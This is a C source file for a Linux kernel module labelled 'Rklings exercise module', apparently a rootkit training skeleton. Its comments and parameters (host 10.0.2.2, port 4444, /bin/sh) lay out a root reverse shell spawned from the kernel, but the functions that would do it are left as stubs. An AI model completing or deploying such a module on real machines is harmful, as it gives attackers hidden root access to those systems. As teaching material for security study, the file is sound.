// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/cred.h>
#include <linux/sched/task.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/mutex.h>
#include <net/sock.h>

static char *host = "10.0.2.2";
module_param(host, charp, 0400);

static int port = 4444;
module_param(port, int, 0400);

static struct file *rk_sock_file;
static DEFINE_MUTEX(rk_shell_lock);
static bool rk_shell_busy;

static int rk_umh_init(struct subprocess_info *info, struct cred *new)
{
	int fd;
	int i;

	// Escalate to root, then install the socket file as fd 0, 1, 2.

	return 0;
}

static int __init rk_init(void)
{
	struct socket *sock;
	struct sockaddr_in addr;
	struct subprocess_info *info;
	int error;

	char *argv[] = { "/bin/sh", NULL };
	char *envp[] = {
		"HOME=/",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
		NULL
	};

	// Connect to host:port, convert socket to file, spawn shell.

	return 0;

out_file:
	fput(rk_sock_file);
	rk_sock_file = NULL;
	goto out_clear;

out_sock:
	sock_release(sock);

out_clear:
	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
	return error;
}

static void __exit rk_exit(void)
{
	if (rk_sock_file)
		fput(rk_sock_file);

	mutex_lock(&rk_shell_lock);
	rk_shell_busy = false;
	mutex_unlock(&rk_shell_lock);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings exercise module");
